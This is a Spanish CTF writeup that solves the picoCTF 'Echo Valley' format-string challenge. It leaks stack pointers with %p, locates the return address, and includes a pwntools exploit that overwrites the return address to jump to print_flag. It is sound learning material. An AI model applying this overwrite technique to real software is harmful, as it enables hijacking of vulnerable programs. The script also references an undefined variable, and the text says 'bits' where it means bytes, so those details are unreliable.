---
layout: post
title: Echo Valley PicoGym
comments: true
categories: [Pwn, Writeups, Pwn.college]
---

En este post estaremos resolviendo un reto de *Format String* del [PicoGym](https://play.picoctf.org/practice/challenge/485?category=6&page=1).

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/yellow.svg){:width="200px"}
<br>

# Reconocimiento

    The echo valley is a simple function that echoes back whatever you say to it.
    But how do you make it respond with something more interesting, like a flag?

## Analizando el format string

```
Welcome to the Echo Valley, Try Shouting: 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
You heard in the distance: 0x7fffffffd960 (nil) (nil) 0x555555559710 0x4 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 (nil) 0x589182b1c0e0300 0x7fffffffdb90 0x555555555413 0x1 0x7ffff7ddad68 0x7fffffffdc90 0x555555555401 0x155554040 0x7fffffffdca8 0x7fffffffdca8 0x672ff6e27803b87b (nil) 0x7fffffffdcb8 0x7ffff7ffd000
```

Vemos que tenemos una dirección que parece interesante, en la posición 21, `0x555555555413`. Es la dirección justo siguiente a la llamada a `echo_valley`, por lo que tiene pinta de ser la dirección de retorno. Modificando esta dirección podemos saltar a la función `print_flag`.

```bash
disass main
Dump of assembler code for function main:
   0x0000555555555401 <+0>:	endbr64
   0x0000555555555405 <+4>:	push   rbp
   0x0000555555555406 <+5>:	mov    rbp,rsp
   0x0000555555555409 <+8>:	mov    eax,0x0
   0x000055555555540e <+13>:	call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:	mov    eax,0x0
   0x0000555555555418 <+23>:	pop    rbp
   0x0000555555555419 <+24>:	ret
```

Teniendo la direccción de retorno podemos extraer `rbp`, ya que estará en la posición anterior, es decir, la 20. Con el `$rbp` podemos obtener la dirección en la que está almacenada la dirección de retorno, esto se debe a que `$rbp` apunta siempre 8 bits antes de la dirección de retorno.

```
0x...dfc0 |  ... (buffer de 100 bytes) ...
0x...dfb0 |  Saved %rbp (apunta a la dirección de después de la dir. retorno)---+
0x...dfb8 |  Return address → <main+18>                                         |
0x....... |                               <-------------------------------------+
```

# Explotación

## Calculando el offset hasta print_flag

Sabiendo donde se almacena la dirección de retorno podemos utilizar el format string para sobreescribirla con la dirección de `print_flag`. Podemos calcular la distancia de `main` hasta `print_flag`, para poder calcular la dirección de `print_flag` en tiempo de ejecución:

```
gdb-peda$ disass print_flag 
Dump of assembler code for function print_flag:
   0x0000555555555269 <+0>:	endbr64
```

```
>>> 0x0000555555555413 - 0x0000555555555269
'0x1aa'
```

## Lanzando el ataque

Es posible hacerlo de forma manual, pero en este caso lo lanzaremos utilizando la función `fmtstr_payload` de pwntools:

```python
#!/usr/bin/env python3
from pwn import *

binary = "./valley"
context.arch = "amd64"

p = process(binary)

p.recvuntil(b"Shouting: ")
p.send(b"%20$p::%21$p")

p.recvuntil(b"You heard in the distance: ")
addresses = p.recv().decode().strip().split("::")

return_address = int(addresses[0], 16) - 8 # Dirección de rip a partir de rbp
main_address = int(addresses[1], 16)

# Calculamos la dirección de print_flag en tiempo real
print_flag_address = main_function_address - 0x1aa

log.info(f"return = {hex(return_address)}")
log.info(f"main = {hex(main_address)}")
log.info(f"print_flag = {hex(print_flag_address)}")

# Se debe mandar el payload en varios chunks
#  porque el buffer está limitado a 100 bytes
chunks = [
   print_flag_address & 0xFFFF,
   (print_flag_address >> 16) & 0xFFFF,
   (print_flag_address >> 32) & 0xFFFF,
]

log.info(f"sending the first {hex(chunks[0])} bytes")
p.sendline(fmtstr_payload(6, {return_address: chunks[0]}))
log.info(f"sending the second {hex(chunks[1])} bytes")
p.sendline(fmtstr_payload(6, {return_address + 2: chunks[1]}))
log.info(f"sending the third {hex(chunks[2])} bytes")
p.sendline(fmtstr_payload(6, {return_address + 4: chunks[2]}))

p.interactive()

```

# Créditos

Crédito al [writeup](https://hackmd.io/@sal/HJtUdR5n1e) que me ayudó a resolver el ejercicio.